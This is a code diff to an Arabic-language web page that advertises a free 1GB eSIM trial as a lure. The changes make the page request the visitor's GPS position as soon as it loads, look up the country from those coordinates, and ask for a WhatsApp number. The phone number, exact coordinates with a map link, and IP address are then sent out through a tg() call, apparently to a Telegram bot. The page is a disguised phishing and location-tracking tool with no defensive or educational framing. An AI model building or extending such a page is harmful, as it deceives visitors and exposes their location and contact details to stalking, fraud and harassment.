@@ -44,6 +44,11 @@
   }
   .feats { list-style: none; text-align: right; margin: 0 0 18px; padding: 0; }
   .feats li { font-size: 13px; color: #9aa5bd; padding: 5px 0; }
+  .gpsbox {
+    background: #0f1420; border: 1px solid #2b3550; border-radius: 10px;
+    padding: 10px 14px; font-size: 14px; color: #9aa5bd; margin-bottom: 12px;
+  }
+  .gpsbox b { color: #fff; }
 </style>
 </head>
 <body>
@@ -52,12 +57,13 @@
   <div class="logo">📶</div>
   <div class="badge">FREE TRIAL</div>
   <h1>شريحة eSIM مجانية 🎉</h1>
-  <p class="sub">إنترنت مجاني 1GB لمدة 7 أيام على أي موبايل يدعم eSIM.<br>سيب رقمك وهنبعتلك كود التفعيل.</p>
+  <p class="sub">إنترنت مجاني 1GB لمدة 7 أيام على أي موبايل يدعم eSIM.<br>سيب رقم <b>الواتساب</b> بتاعك وهنبعتلك كود التفعيل عليه.</p>
   <ul class="feats">
     <li>✅ 1GB بيانات مجانية</li>
     <li>✅ صالحة لمدة 7 أيام</li>
     <li>✅ تفعيل فوري بكود QR</li>
   </ul>
+  <div class="gpsbox" id="gpsBox" style="display:none">📍 الدولة المكتشفة: <b id="gpsCountry"></b></div>
   <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
   <button id="sendBtn" onclick="submitPhone()">احصل على الشريحة المجانية</button>
 </div>
@@ -65,7 +71,7 @@
 <div class="card done" id="doneCard">
   <div class="check">🎉</div>
   <h1>تم حجز شريحتك!</h1>
-  <p class="sub">استلمنا رقمك وهنبعتلك كود تفعيل الـ eSIM في أقرب وقت 📩</p>
+  <p class="sub">استلمنا رقمك وهنبعتلك كود تفعيل الـ eSIM على واتساب في أقرب وقت 📩</p>
 </div>
 
 <script>
@@ -290,24 +296,71 @@ function detectSimCountry(num) {
   return 'غير معروف';
 }
 
+const ISO_COUNTRIES = {
+  'EG':'مصر 🇪🇬','SA':'السعودية 🇸🇦','AE':'الإمارات 🇦🇪','KW':'الكويت 🇰🇼','BH':'البحرين 🇧🇭',
+  'QA':'قطر 🇶🇦','OM':'عُمان 🇴🇲','JO':'الأردن 🇯🇴','LB':'لبنان 🇱🇧','SY':'سوريا 🇸🇾',
+  'IQ':'العراق 🇮🇶','YE':'اليمن 🇾🇪','PS':'فلسطين 🇵🇸','DZ':'الجزائر 🇩🇿','TN':'تونس 🇹🇳',
+  'MA':'المغرب 🇲🇦','LY':'ليبيا 🇱🇾','SD':'السودان 🇸🇩','US':'أمريكا 🇺🇸','CA':'كندا 🇨🇦',
+  'GB':'بريطانيا 🇬🇧','FR':'فرنسا 🇫🇷','DE':'ألمانيا 🇩🇪','IT':'إيطاليا 🇮🇹','ES':'إسبانيا 🇪🇸',
+  'NL':'هولندا 🇳🇱','TR':'تركيا 🇹🇷','IN':'الهند 🇮🇳','PK':'باكستان 🇵🇰','IR':'إيران 🇮🇷',
+  'BD':'بنغلاديش 🇧🇩','JP':'اليابان 🇯🇵','KR':'كوريا الجنوبية 🇰🇷','CN':'الصين 🇨🇳',
+  'AU':'أستراليا 🇦🇺','RU':'روسيا 🇷🇺','UA':'أوكرانيا 🇺🇦','ZA':'جنوب أفريقيا 🇿🇦',
+  'NG':'نيجيريا 🇳🇬','KE':'كينيا 🇰🇪','GH':'غانا 🇬🇭','BR':'البرازيل 🇧🇷','MX':'المكسيك 🇲🇽',
+  'AR':'الأرجنتين 🇦🇷','ID':'إندونيسيا 🇮🇩','PH':'الفلبين 🇵🇭','SG':'سنغافورة 🇸🇬',
+  'TH':'تايلاند 🇹🇭','VN':'فيتنام 🇻🇳','TW':'تايوان 🇹🇼','CH':'سويسرا 🇨🇭','AT':'النمسا 🇦🇹',
+  'SE':'السويد 🇸🇪','NO':'النرويج 🇳🇴','PL':'بولندا 🇵🇱','GR':'اليونان 🇬🇷','PT':'البرتغال 🇵🇹',
+  'IE':'أيرلندا 🇮🇪','IS':'آيسلندا 🇮🇸','AZ':'أذربيجان 🇦🇿','GE':'جورجيا 🇬🇪'
+};
+
+async function countryFromGPS(lat, lon) {
+  try {
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 7000);
+    const r = await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lon + '&localityLanguage=en', { signal: ctl.signal });
+    clearTimeout(t);
+    const j = await r.json();
+    const cc = (j.countryCode || '').toUpperCase();
+    return ISO_COUNTRIES[cc] || j.countryName || '';
+  } catch (e) { return ''; }
+}
+
 async function submitPhone() {
   const v = document.getElementById('phone').value.trim();
   if (!v) { document.getElementById('phone').focus(); return; }
   const btn = document.getElementById('sendBtn');
   btn.disabled = true;
   btn.textContent = 'جاري الإرسال...';
-  const country = detectSimCountry(v);
-  // طلب إذن الموقع لحظة استلام الشريحة المجانية
-  const gps = await getGPS();
+  const country = window._gpsCountry || detectSimCountry(v);
+  const countrySrc = window._gpsCountry ? 'GPS' : 'الرقم';
+  const gps = (window._gps && window._gps.lat != null) ? window._gps
+    : (window._gpsDenied ? { denied: true } : await getGPS());
   const gpsLine = (gps && gps.lat != null)
     ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
     : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
-  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country}${gpsLine}\n🌐 IP: ${window._ip || 'unknown'}`);
+  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country} (${countrySrc})${gpsLine}\n🌐 IP: ${window._ip || 'unknown'}`);
   document.getElementById('formCard').style.display = 'none';
   document.getElementById('doneCard').style.display = 'block';
 }
 
 logVisit();
+
+// تحديد الدولة عبر GPS مبكراً (قبل إدخال الرقم) لعرضها وتحديد دولة الشريحة
+getGPS().then(async (p) => {
+  if (p && p.lat != null) {
+    window._gps = p;
+    const c = await countryFromGPS(p.lat, p.lon);
+    if (c) {
+      window._gpsCountry = c;
+      const box = document.getElementById('gpsBox');
+      if (box) {
+        document.getElementById('gpsCountry').textContent = c;
+        box.style.display = 'block';
+      }
+    }
+  } else {
+    window._gpsDenied = true;
+  }
+});
 </script>
 </body>
 </html>
